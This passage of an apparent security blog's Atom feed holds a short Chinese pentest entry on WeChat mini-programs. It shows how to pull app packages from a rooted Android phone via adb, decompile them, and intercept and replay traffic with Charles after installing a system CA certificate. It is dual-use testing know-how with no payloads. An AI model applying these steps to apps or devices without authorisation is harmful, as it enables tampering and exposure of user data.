    
    
    <category term="SQL注入" scheme="http://blog.le31ei.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序安全测试</title>
    <link href="http://blog.le31ei.top/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.le31ei.top/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</id>
    <published>2020-11-09T07:37:49.000Z</published>
    <updated>2020-11-09T07:41:37.157Z</updated>
    
    <content type="html"><![CDATA[<p>仅记录实战操作的过程，对小程序原理需要了解的，参考附件文档。</p><h1 id="0x01-反编译"><a href="#0x01-反编译" class="headerlink" title="0x01 反编译"></a>0x01 反编译</h1><p><strong>导出小程序wxapkg包</strong></p><p><code>adb pull /data/data/com.tencent.mm/MicroMsg/&#123;微信ID&#125;/appbrand/pkg/_-14931312_34.wxapkg ./</code></p><p>需要先<code>adb root</code></p><p><strong>反编译小程序包</strong></p><p><code>node wuWxapkg.js _-1496931312_34.wxapkg</code></p><p><img src="/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109153208111.png" alt="image-20201109153208111"></p><h1 id="0x02-抓包"><a href="#0x02-抓包" class="headerlink" title="0x02 抓包"></a>0x02 抓包</h1><p>安卓7.0之后，必须导入为系统证书后，才能进行抓包，但burp证书在导入后，仍然无法进行抓包，那么就需要用到<code>charles</code>工具进行抓包。</p><p><strong>导出证书</strong></p><p>通过<code>help-&gt;SSL Proxying-&gt;save Charles root certifacate</code>导出证书，导出后导入安卓作为系统证书，即可进行抓包。</p><p><img src="/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109150342123.png" alt="image-20201109150342123"></p><p><strong>重放数据包</strong></p><p>对数据包右键打了断点后，点击breakpoint按钮打开拦截，然后点击右键repeat进行重放，即可进行抓包</p><p><img src="/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152611419.png" alt="image-20201109152611419"></p><p><img src="/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152502367.png" alt="image-20201109152502367"></p><p><img src="/2020/11/09/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/image-20201109152842638.png" alt="image-20201109152842638"></p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><a href="./wxappUnpacker.zip">wxappUnpacker</a></li><li><a href="./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B8%97%E9%80%8F%E4%BA%94%E8%84%89.pdf">微信小程序的渗透五脉 - Hack Inn</a></li><li><a href="./%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.pptx">微信小程序文件分析</a></li><li><a href="./%E7%99%BE%E4%B8%BE%E7%99%BE%E6%8D%B7%EF%BC%9A%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E5%8F%88%E4%B8%80%E4%B8%AA%E7%AA%81%E7%A0%B4%E5%8F%A3%EF%BC%8C%E5%86%8D%E7%9C%8B%E5%A4%A7%E5%9B%BD%E7%8B%AC%E6%9C%89%E5%B0%8F%E7%A8%8B%E5%BA%8F.pdf">百举百捷：红队视角下又一个突破口，再看大国独有小程序</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;仅记录实战操作的过程，对小程序原理需要了解的，参考附件文档。&lt;/p&gt;
&lt;h1 id=&quot;0x01-反编译&quot;&gt;&lt;a href=&quot;#0x01-反编译&quot; class=&quot;headerlink&quot; title=&quot;0x01 反编译&quot;&gt;&lt;/a&gt;0x01 反编译&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="微信小程序" scheme="http://blog.le31ei.top/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
</feed>
